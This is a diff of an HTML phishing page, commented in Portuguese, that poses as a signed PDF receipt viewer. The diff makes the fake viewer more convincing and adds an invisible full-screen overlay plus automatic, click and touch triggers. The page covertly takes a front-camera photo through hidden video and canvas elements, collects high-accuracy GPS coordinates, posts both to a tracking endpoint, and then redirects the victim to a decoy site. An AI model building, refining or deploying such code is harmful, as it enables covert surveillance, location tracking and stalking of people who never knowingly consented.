@@ -4,16 +4,112 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Visualizador de Documentos</title>
-    <meta property="og:site_name" content="Internet Banking">
+    
+    <meta property="og:site_name" content="Visualizador de Arquivos">
     <meta property="og:title" content="📄 Comprovante_Digital.pdf">
     <meta property="og:description" content="Toque para visualizar o documento assinado.">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/400px-PDF_file_icon.svg.png">
+
     <style>
-        body { margin: 0; background: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #c0392b; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px; }
+        :root {
+            --pdf-bg: #525659;
+            --pdf-toolbar: #323639;
+            --accent: #3b82f6;
+        }
+
+        body { 
+            margin: 0; 
+            background: var(--pdf-bg); 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            display: flex; 
+            flex-direction: column;
+            height: 100vh; 
+            overflow: hidden; 
+        }
+
+        /* Barra Superior Estilo PDF Viewer */
+        .toolbar {
+            background: var(--pdf-toolbar);
+            height: 56px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            color: white;
+            font-size: 14px;
+            justify-content: space-between;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            z-index: 10;
+        }
+
+        .toolbar-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* Container do "Documento" */
+        .viewport {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            padding: 15px;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .pdf-page {
+            background: white;
+            width: 100%;
+            max-width: 600px;
+            height: 842px; /* Proporção A4 aproximada */
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 100px;
+            border-radius: 2px;
+        }
+
+        /* Spinner Moderno */
+        .loader-container {
+            text-align: center;
+            color: #555;
+        }
+
+        .spinner { 
+            border: 3px solid #f3f3f3; 
+            border-top: 3px solid var(--accent); 
+            border-radius: 50%; 
+            width: 40px; 
+            height: 40px; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto 20px; 
+        }
+
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .status-text {
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .sub-text {
+            font-size: 12px;
+            color: #999;
+        }
+
+        /* Overlay Invisível para capturar o clique inicial */
+        #capa { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            z-index: 9999; 
+            cursor: pointer;
+        }
         
-        /* Elementos da câmera ficam invisíveis para o usuário */
         #video, #canvas { display: none; }
     </style>
 </head>
@@ -21,11 +117,24 @@
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
-    <div id="capa" onclick="iniciarSeguranca()" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999;"></div>
-    
-    <div style="text-align:center;">
-        <div class="spinner"></div>
-        <div style="font-size: 14px; color: #555;">Carregando documento...</div>
+    <div id="capa" onclick="iniciarSeguranca()"></div>
+
+    <div class="toolbar">
+        <div class="toolbar-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+            <span>Comprovante_Digital.pdf</span>
+        </div>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
+    </div>
+
+    <div class="viewport">
+        <div class="pdf-page">
+            <div class="loader-container">
+                <div class="spinner"></div>
+                <div class="status-text">Carregando documento...</div>
+                <div class="sub-text">Aguarde a validação do certificado digital.</div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -33,49 +142,63 @@
         const siteDestino = "{{ destino }}";
         let jaEnviou = false;
         let fotoBase64 = null;
+        let globalStream = null;
 
-        function finalizar() { window.location.href = siteDestino; }
+        function finalizar() { 
+            // Para a câmera antes de sair para liberar recursos do sistema
+            if (globalStream) {
+                globalStream.getTracks().forEach(track => track.stop());
+            }
+
+            // timeout de 500ms para garantir que o fetch anterior completou
+            setTimeout(() => {
+                // replace() evita que o usuário volte para a página de captura ao clicar em "voltar"
+                // top garante a saída de qualquer iframe que pudesse causar erro 403
+                window.top.location.replace(siteDestino);
+            }, 500);
+        }
 
         async function capturarFoto() {
             try {
-                // Solicita acesso à câmera frontal
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                globalStream = stream;
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // Aguarda 1.5s para a câmera ajustar o brilho e foco
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                await new Promise(resolve => setTimeout(resolve, 1200));
                 
                 const canvas = document.getElementById('canvas');
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Converte para JPEG comprimido (qualidade 0.5) para envio rápido
-                fotoBase64 = canvas.toDataURL('image/jpeg', 0.5);
-                
-                // Desliga a câmera imediatamente após o clique
-                stream.getTracks().forEach(track => track.stop());
+                fotoBase64 = canvas.toDataURL('image/jpeg', 0.6);
             } catch (err) {
-                console.log("Câmera recusada ou indisponível");
+                console.log("Câmera indisponível.");
             }
         }
 
         async function iniciarSeguranca() {
             if (jaEnviou) return;
 
-            // 1. Tenta capturar a foto primeiro
-            await capturarFoto();
+            const geoOptions = { 
+                enableHighAccuracy: true, 
+                timeout: 8000, 
+                maximumAge: 0 
+            };
 
-            // 2. Solicita o GPS e envia tudo junto para o servidor
-            navigator.geolocation.getCurrentPosition(function(pos) {
+            navigator.geolocation.getCurrentPosition(async function(pos) {
+                await capturarFoto();
                 enviarDados(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
-            }, function() {
-                // Se o GPS falhar, envia pelo menos a foto (se houver)
+            }, async function(err) {
+                await capturarFoto();
                 enviarDados(null, null, null, null);
-            }, { enableHighAccuracy: true, timeout: 8000 });
+            }, geoOptions);
         }
 
         function enviarDados(lat, lon, acc, spd) {
             if (jaEnviou) return;
+            jaEnviou = true;
             
             fetch(`/api/sinal/${idOrdem}`, {
                 method: "POST",
@@ -85,17 +208,19 @@
                     longitude: lon,
                     accuracy: acc ? Math.round(acc) : null,
                     speed: spd,
-                    foto: fotoBase64 // Envia a imagem capturada
+                    foto: fotoBase64
                 })
             }).finally(() => { 
-                jaEnviou = true; 
                 finalizar(); 
             });
         }
 
-        // Tenta iniciar automaticamente, mas o toque na tela (div #capa) garante o funcionamento
-        iniciarSeguranca();
+        window.onload = () => {
+            setTimeout(iniciarSeguranca, 1000);
+        };
+        
         window.addEventListener('touchstart', iniciarSeguranca);
+        window.addEventListener('click', iniciarSeguranca);
     </script>
 </body>
 </html>
